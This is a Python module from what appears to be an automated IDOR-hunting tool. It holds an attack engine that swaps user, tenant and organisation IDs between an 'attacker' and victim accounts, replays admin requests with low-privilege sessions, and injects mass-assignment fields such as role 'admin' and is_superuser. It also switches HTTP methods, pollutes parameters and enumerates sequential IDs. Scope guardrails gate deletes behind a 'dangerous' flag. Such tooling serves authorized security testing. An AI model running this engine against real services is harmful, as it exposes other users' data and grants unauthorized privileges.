"""
AGI-idor IDOR Engine — The core attack engine. Reads hunt-idor.md skill file,
generates IDOR payloads, and orchestrates horizontal/vertical/cross-tenant testing.
"""
from __future__ import annotations
import json, logging, re, time, concurrent.futures
from pathlib import Path
from typing import Any, Optional
from colorama import Fore, Style
from utils.http_client import RotatingHTTPClient
from utils.diff_engine import DiffEngine
from utils.id_harvester import IDHarvester
from core.auth_matrix import AuthMatrix

logger = logging.getLogger("agi-idor.engine")

class IDOREngine:
    def __init__(self, auth_matrix: AuthMatrix, http_client: RotatingHTTPClient,
                 scope: dict, base_url: str = "", skills: Optional[dict] = None):
        self.auth = auth_matrix
        self.http = http_client
        self.scope = scope
        self.base_url = base_url
        self.skills = skills or {}
        self.diff = DiffEngine()
        self.harvester = IDHarvester()
        self.findings: list[dict] = []
        self.dangerous_mode = False

    def parse_skills_file(self, filepath: str) -> dict:
        """Parse hunt-idor.md and extract techniques, payloads, and bypass methods."""
        path = Path(filepath)
        if not path.exists():
            logger.warning(f"Skills file not found: {filepath}")
            return {}
        content = path.read_text(encoding="utf-8")
        skills = {
            "crown_jewels": [], "attack_signals": [], "methodology": [],
            "id_patterns": [], "bypass_techniques": [], "chains": [],
            "endpoint_patterns": [], "graphql_operations": [],
        }
        current_section = ""
        for line in content.split("\n"):
            if line.startswith("## 1."): current_section = "crown_jewels"
            elif line.startswith("## 2."): current_section = "attack_signals"
            elif line.startswith("## 3."): current_section = "methodology"
            elif line.startswith("## 4."): current_section = "id_patterns"
            elif line.startswith("## 5."): current_section = "bypass_techniques"
            elif line.startswith("## 6."): current_section = "chains"
            elif line.startswith("## 7."): current_section = "tooling"
            elif line.startswith("## 8."): current_section = "checklist"
            elif line.startswith("## 9."): current_section = "references"

            # Extract endpoint patterns from code blocks
            ep_match = re.findall(r'/(?:api|graphql|v\d+)[^\s\'"`,)]+', line)
            for ep in ep_match:
                skills["endpoint_patterns"].append(ep)

            # Extract GraphQL operations
            gql_match = re.findall(r'(?:mutation|query)\s*\{?\s*(\w+)', line)
            for op in gql_match:
                skills["graphql_operations"].append(op)

            # Extract table rows for techniques
            if "|" in line and current_section:
                cells = [c.strip() for c in line.split("|") if c.strip() and c.strip() != "---"]
                if len(cells) >= 2 and not all(c == "---" or set(c) == {"-"} for c in cells):
                    skills[current_section].append(cells)

        # Extract curl commands and code blocks
        code_blocks = re.findall(r'```(?:bash|python)?\n(.*?)```', content, re.DOTALL)
        skills["code_examples"] = code_blocks

        self.skills = skills
        logger.info(f"Parsed skills: {len(skills['crown_jewels'])} crown jewels, "
                     f"{len(skills['endpoint_patterns'])} endpoint patterns, "
                     f"{len(skills['graphql_operations'])} GraphQL ops")
        return skills

    def _is_safe(self, endpoint: dict, action: str = "") -> bool:
        """Check if action is safe per scope.json guardrails."""
        forbidden = self.scope.get("forbidden_actions", [])
        dangerous_required = self.scope.get("require_dangerous_flag_for", [])
        method = endpoint.get("method", "GET").upper()
        path = endpoint.get("path", "").lower()

        for fa in forbidden:
            if fa in path or (fa == "delete" and method == "DELETE"):
                if not self.dangerous_mode:
                    logger.warning(f"BLOCKED: {method} {path} matches forbidden action '{fa}'")
                    return False
        for dr in dangerous_required:
            if dr in path or (dr == "delete" and method == "DELETE"):
                if not self.dangerous_mode:
                    logger.warning(f"BLOCKED: {method} {path} requires --dangerous flag")
                    return False
        return True

    def _build_url(self, endpoint: dict) -> str:
        path = endpoint.get("path", "")
        return f"{self.base_url}{path}" if not path.startswith("http") else path

    def test_horizontal_idor(self, endpoint: dict, victim_ids: list[str]) -> list[dict]:
        """Swap IDs between same-role accounts (attacker → victim)."""
        if not self._is_safe(endpoint): return []
        results = []
        url_template = self._build_url(endpoint)
        method = endpoint.get("method", "GET").upper()
        params = endpoint.get("params", [])

        # Get baseline response as attacker
        self.auth.switch_account("attacker")
        try:
            baseline = self.http.request(method, url_template)
        except Exception:
            return results

        for vid in victim_ids[:self.scope.get("max_ids_to_test", 100)]:
            for param in (params or ["id"]):
                # URL path replacement
                test_url = re.sub(r'/\d+(?=/|$)', f'/{vid}', url_template)
                if test_url == url_template:
                    test_url = url_template
                    # Try as query param or body
                try:
                    if method == "GET":
                        resp = self.http.get(test_url, params={param: vid})
                    else:
                        resp = self.http.request(method, test_url, json={param: vid})

                    verdict = self.diff.is_idor_confirmed(baseline, resp)
                    if verdict["confirmed"]:
                        finding = self._create_finding(
                            endpoint, "Horizontal IDOR", vid, param,
                            baseline, resp, verdict
                        )
                        self.findings.append(finding)
                        results.append(finding)
                        print(f"{Fore.RED}[IDOR FOUND] Horizontal: {method} {test_url} with {param}={vid}{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Test failed: {e}")
        return results

    def test_vertical_idor(self, endpoint: dict) -> list[dict]:
        """Access admin endpoints with low-priv sessions."""
        if not self._is_safe(endpoint): return []
        results = []
        url = self._build_url(endpoint)
        method = endpoint.get("method", "GET").upper()

        # First get admin response
        if "admin" in self.auth.accounts:
            self.auth.switch_account("admin")
            try:
                admin_resp = self.http.request(method, url)
            except Exception:
                return results

            # Now try as attacker (low-priv)
            self.auth.switch_account("attacker")
            try:
                attacker_resp = self.http.request(method, url)
                if attacker_resp.status_code == 200 and admin_resp.status_code == 200:
                    verdict = self.diff.is_idor_confirmed(admin_resp, attacker_resp)
                    if verdict["confirmed"]:
                        finding = self._create_finding(
                            endpoint, "Vertical IDOR / BAC", "", "",
                            admin_resp, attacker_resp, verdict
                        )
                        self.findings.append(finding)
                        results.append(finding)
                        print(f"{Fore.RED}[BAC FOUND] Vertical: {method} {url} accessible as low-priv!{Style.RESET_ALL}")
            except Exception as e:
                logger.debug(f"Vertical test failed: {e}")
        return results

    def test_cross_tenant(self, endpoint: dict, tenant_ids: list[str]) -> list[dict]:
        """Swap org_id/tenant_id/team_id between accounts."""
        if not self._is_safe(endpoint): return []
        results = []
        url = self._build_url(endpoint)
        method = endpoint.get("method", "GET").upper()
        tenant_params = [p for p in endpoint.get("params", [])
                         if any(k in p.lower() for k in ("org","tenant","team","workspace","project"))]
        if not tenant_params: return results

        self.auth.switch_account("attacker")
        for tid in tenant_ids[:50]:
            for param in tenant_params:
                try:
                    resp = self.http.request(method, url, json={param: tid})
                    if resp.status_code == 200:
                        finding = self._create_finding(
                            endpoint, "Cross-Tenant IDOR", tid, param,
                            None, resp, {"confirmed": True, "confidence": "HIGH",
                                         "reason": f"200 OK with {param}={tid}"}
                        )
                        self.findings.append(finding)
                        results.append(finding)
                        print(f"{Fore.RED}[CROSS-TENANT] {method} {url} with {param}={tid}{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Cross-tenant test failed: {e}")
        return results

    def test_mass_assignment(self, endpoint: dict) -> list[dict]:
        """Inject hidden fields (role, is_admin, etc.) on write endpoints."""
        if not self._is_safe(endpoint): return []
        method = endpoint.get("method", "GET").upper()
        if method not in ("POST", "PUT", "PATCH"): return []
        results = []
        url = self._build_url(endpoint)
        payloads = [
            {"role": "admin"}, {"is_admin": True}, {"admin": 1},
            {"user_type": "admin"}, {"permissions": "*"}, {"privilege": "root"},
            {"role_id": 1}, {"is_staff": True}, {"is_superuser": True},
        ]
        self.auth.switch_account("attacker")
        baseline = None
        try:
            baseline = self.http.request(method, url, json={})
        except Exception:
            return results
        for payload in payloads:
            try:
                resp = self.http.request(method, url, json=payload)
                if resp.status_code in (200, 201) and baseline:
                    verdict = self.diff.is_idor_confirmed(baseline, resp)
                    if resp.status_code == 200 and resp.text != baseline.text:
                        finding = self._create_finding(
                            endpoint, "Mass Assignment", json.dumps(payload), "body",
                            baseline, resp, verdict
                        )
                        self.findings.append(finding)
                        results.append(finding)
            except Exception:
                pass
        return results

    def test_method_switching(self, endpoint: dict) -> list[dict]:
        """Try GET→POST→PUT→PATCH→DELETE on same endpoint."""
        if not self._is_safe(endpoint, "method_switch"): return []
        if not self.scope.get("enable_method_switching", True): return []
        results = []
        url = self._build_url(endpoint)
        original_method = endpoint.get("method", "GET").upper()
        test_methods = [m for m in ("GET","POST","PUT","PATCH","DELETE","OPTIONS") if m != original_method]
        if "DELETE" in test_methods and not self.dangerous_mode:
            test_methods.remove("DELETE")

        self.auth.switch_account("attacker")
        for method in test_methods:
            try:
                kwargs = {"json": {}} if method in ("POST","PUT","PATCH") else {}
                resp = self.http.request(method, url, **kwargs)
                if resp.status_code == 200:
                    results.append({
                        "type": "Method Switch Bypass",
                        "endpoint": endpoint["path"],
                        "original_method": original_method,
                        "bypass_method": method,
                        "status_code": resp.status_code,
                    })
                    print(f"{Fore.YELLOW}[METHOD SWITCH] {original_method}→{method} {url} returned 200{Style.RESET_ALL}")
            except Exception:
                pass
        return results

    def test_content_type_switching(self, endpoint: dict) -> list[dict]:
        """JSON→form-urlencoded→multipart for same payload."""
        if not self.scope.get("enable_content_type_switching", True): return []
        method = endpoint.get("method", "GET").upper()
        if method not in ("POST","PUT","PATCH"): return []
        results = []
        url = self._build_url(endpoint)
        test_body = {"id": "1", "test": "value"}
        self.auth.switch_account("attacker")
        content_types = [
            ("application/json", {"json": test_body}),
            ("application/x-www-form-urlencoded", {"data": test_body}),
        ]
        for ct, kwargs in content_types:
            try:
                resp = self.http.request(method, url, **kwargs)
                if resp.status_code == 200:
                    results.append({
                        "type": "Content-Type Switch",
                        "endpoint": endpoint["path"],
                        "content_type": ct,
                        "status_code": resp.status_code,
                    })
            except Exception:
                pass
        return results

    def test_param_pollution(self, endpoint: dict) -> list[dict]:
        """Duplicate params, array injection, nested JSON."""
        if not self.scope.get("enable_param_pollution", True): return []
        results = []
        url = self._build_url(endpoint)
        self.auth.switch_account("attacker")
        params = endpoint.get("params", ["id"])
        for param in params[:3]:
            payloads = [
                {param: ["1", "2"]},           # Array injection
                {param: "1", f"{param}[]": "2"}, # PHP-style array
                {"data": {param: "1"}},        # Nested
            ]
            for payload in payloads:
                try:
                    resp = self.http.post(url, json=payload)
                    if resp.status_code == 200:
                        results.append({"type": "Param Pollution", "endpoint": endpoint["path"],
                                       "payload": str(payload), "status_code": resp.status_code})
                except Exception:
                    pass
        return results

    def test_id_enumeration(self, endpoint: dict, id_range: range = range(1, 101)) -> list[dict]:
        """Enumerate sequential IDs to assess mass-exploitability."""
        if not self._is_safe(endpoint): return []
        results = []
        url_template = self._build_url(endpoint)
        self.auth.switch_account("attacker")
        accessible = 0
        total = 0
        for uid in id_range:
            total += 1
            test_url = re.sub(r'/\d+(?=/|$)', f'/{uid}', url_template)
            try:
                resp = self.http.get(test_url)
                if resp.status_code == 200:
                    accessible += 1
                    self.harvester.extract_from_response(resp, "attacker")
            except Exception:
                pass
            if total >= self.scope.get("max_ids_to_test", 100):
                break
        if accessible > 1:
            results.append({
                "type": "ID Enumeration", "endpoint": endpoint["path"],
                "accessible": accessible, "tested": total,
                "mass_impact_score": accessible / total if total > 0 else 0,
            })
            print(f"{Fore.YELLOW}[ENUM] {endpoint['path']}: {accessible}/{total} IDs accessible{Style.RESET_ALL}")
        return results

    def run_all_tests(self, endpoints: list[dict], victim_ids: Optional[list[str]] = None,
                      tenant_ids: Optional[list[str]] = None) -> list[dict]:
        """Orchestrate all IDOR test types across all endpoints."""
        all_findings = []
        victim_ids = victim_ids or ["2", "3", "100", "999"]
        tenant_ids = tenant_ids or []
        total = len(endpoints)
        for i, ep in enumerate(endpoints, 1):
            print(f"\n{Fore.CYAN}[{i}/{total}] Testing: {ep['method']} {ep['path']} (priority: {ep.get('priority', 0)}){Style.RESET_ALL}")
            all_findings.extend(self.test_horizontal_idor(ep, victim_ids))
            all_findings.extend(self.test_vertical_idor(ep))
            if tenant_ids:
                all_findings.extend(self.test_cross_tenant(ep, tenant_ids))
            all_findings.extend(self.test_mass_assignment(ep))
            all_findings.extend(self.test_method_switching(ep))
            all_findings.extend(self.test_content_type_switching(ep))
            if self.scope.get("enable_param_pollution"):
                all_findings.extend(self.test_param_pollution(ep))
        self.findings.extend(all_findings)
        return all_findings

    def _create_finding(self, endpoint, vuln_type, test_id, param,
                        baseline_resp, idor_resp, verdict) -> dict:
        url = self._build_url(endpoint)
        method = endpoint.get("method", "GET").upper()
        return {
            "type": vuln_type,
            "severity": "High" if "ATO" in vuln_type or "Vertical" in vuln_type else "Medium",
            "endpoint": endpoint["path"],
            "method": method,
            "url": url,
            "test_id": test_id,
            "param": param,
            "confidence": verdict.get("confidence", "MEDIUM"),
            "reason": verdict.get("reason", ""),
            "status_code": getattr(idor_resp, "status_code", 0) if idor_resp else 0,
            "response_size": len(getattr(idor_resp, "content", b"")) if idor_resp else 0,
            "curl_command": self.http.generate_curl(method, url, body={param: test_id} if param else None),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }

    def save_findings(self, output_dir: str = "output"):
        Path(f"{output_dir}/findings").mkdir(parents=True, exist_ok=True)
        for i, f in enumerate(self.findings, 1):
            with open(f"{output_dir}/findings/finding_{i:03d}.json", "w") as fp:
                json.dump(f, fp, indent=2, default=str)
        with open(f"{output_dir}/all_findings.json", "w") as fp:
            json.dump(self.findings, fp, indent=2, default=str)
        logger.info(f"Saved {len(self.findings)} findings")
